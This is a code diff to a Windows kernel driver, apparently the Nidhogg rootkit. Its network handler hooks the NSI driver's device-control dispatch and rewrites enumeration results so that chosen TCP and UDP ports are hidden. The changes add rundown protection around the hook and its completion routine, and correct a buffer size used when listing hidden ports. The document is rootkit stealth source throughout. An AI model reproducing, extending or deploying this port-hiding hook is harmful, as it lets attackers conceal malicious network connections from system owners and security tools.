@@ -5,6 +5,7 @@ _IRQL_requires_max_(APC_LEVEL)
 NetworkHandler::NetworkHandler() {
 	callbackActivated = false;
 	originalNsiDispatchAddress = NULL;
+	rundown = RundownProtection();
 
 	if (!InitializeList(&hiddenTcpPorts))
 		ExRaiseStatus(STATUS_INSUFFICIENT_RESOURCES);
@@ -25,9 +26,20 @@ NetworkHandler::~NetworkHandler() {
 			NidhoggLogger.Error(DRIVER_PREFIX "Failed to remove NSI hook: (0x%08X).\n", status);
 		callbackActivated = false;
 	}
+	rundown.Complete();
 	ClearHiddenPortsList(PortType::All);
 	FreeVirtualMemory(hiddenTcpPorts.Items);
 	FreeVirtualMemory(hiddenUdpPorts.Items);
+}
+
+_IRQL_requires_max_(DISPATCH_LEVEL)
+bool NetworkHandler::AcquireRundown() {
+	return rundown.Acquire();
+}
+
+_IRQL_requires_max_(DISPATCH_LEVEL)
+void NetworkHandler::ReleaseRundown() {
+	rundown.Release();
 }
 
 /*
@@ -61,6 +73,7 @@ NTSTATUS NetworkHandler::InstallNsiHook(_In_ bool remove) {
 	LONG64* deviceControlAddress = reinterpret_cast<LONG64*>(&driverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL]);
 
 	if (!remove) {
+		rundown.Reinit();
 		originalNsiDispatchAddress = reinterpret_cast<PVOID>(InterlockedExchange64(deviceControlAddress,
 			reinterpret_cast<LONG64>(HookedNsiDispatch)));
 		callbackActivated = true;
@@ -69,6 +82,7 @@ NTSTATUS NetworkHandler::InstallNsiHook(_In_ bool remove) {
 		InterlockedExchange64(deviceControlAddress, reinterpret_cast<LONG64>(originalNsiDispatchAddress));
 		originalNsiDispatchAddress = nullptr;
 		callbackActivated = false;
+		rundown.Complete();
 	}
 
 	ObDereferenceObject(driverObject);
@@ -289,7 +303,7 @@ bool NetworkHandler::ListHiddenPorts(_Inout_ IoctlHiddenPorts* hiddenPorts) cons
 		hiddenPorts->Count = hiddenPortsList.Count;
 		return true;
 	}
-	MemoryGuard guard(hiddenPorts->Ports, static_cast<ULONG>(sizeof(ULONG) * hiddenPortsList.Count), UserMode);
+	MemoryGuard guard(hiddenPorts->Ports, static_cast<ULONG>(sizeof(IoctlHiddenPortEntry) * hiddenPortsList.Count), UserMode);
 
 	if (!guard.IsValid())
 		return false;
@@ -519,11 +533,16 @@ NTSTATUS NsiIrpComplete(_Inout_ PDEVICE_OBJECT deviceObject, _Inout_ PIRP irp, _
 	if (context->OriginalCompletionRoutine) {
 		PIO_COMPLETION_ROUTINE originalRoutine = context->OriginalCompletionRoutine;
 		PVOID originalContext = context->OriginalContext;
+		NetworkHandler* handler = context->Handler;
 
 		FreeVirtualMemory(irpContext);
+		if (handler)
+			handler->ReleaseRundown();
 		return originalRoutine(deviceObject, irp, originalContext);
 	}
 	
+	if (context->Handler)
+		context->Handler->ReleaseRundown();
 	FreeVirtualMemory(irpContext);
 	return STATUS_SUCCESS;
 }
@@ -543,6 +562,19 @@ _IRQL_requires_max_(DISPATCH_LEVEL)
 _IRQL_requires_same_
 NTSTATUS HookedNsiDispatch(_Inout_ PDEVICE_OBJECT deviceObject, _Inout_ PIRP irp) {
 	auto stack = IoGetCurrentIrpStackLocation(irp);
+	NetworkHandler* handler = NidhoggNetworkHandler;
+
+	if (!handler)
+		return STATUS_DELETE_PENDING;
+	PDRIVER_DISPATCH originalCallback = static_cast<PDRIVER_DISPATCH>(handler->GetOriginalCallback());
+
+	if (!handler->AcquireRundown())
+		return originalCallback ? originalCallback(deviceObject, irp) : STATUS_DELETE_PENDING;
+
+	if (!originalCallback) {
+		handler->ReleaseRundown();
+		return STATUS_DELETE_PENDING;
+	}
 
 	if (stack->Parameters.DeviceIoControl.IoControlCode == IOCTL_NSI_ENUMERATE_OBJECTS_ALL_PARAMETERS) {
 		HookedCompletionRoutine* context = AllocateMemory<HookedCompletionRoutine*>(sizeof(HookedCompletionRoutine), false);
@@ -550,11 +582,15 @@ NTSTATUS HookedNsiDispatch(_Inout_ PDEVICE_OBJECT deviceObject, _Inout_ PIRP irp
 		if (context) {
 			context->OriginalCompletionRoutine = stack->CompletionRoutine;
 			context->OriginalContext = stack->Context;
+			context->Handler = handler;
 			stack->Context = context;
 			stack->CompletionRoutine = NsiIrpComplete;
 			stack->Control |= SL_INVOKE_ON_SUCCESS;
+			return originalCallback(deviceObject, irp);
 		}
 	}
 
-	return (static_cast<PDRIVER_DISPATCH>(NidhoggNetworkHandler->GetOriginalCallback()))(deviceObject, irp);
+	NTSTATUS status = originalCallback(deviceObject, irp);
+	handler->ReleaseRundown();
+	return status;
 }
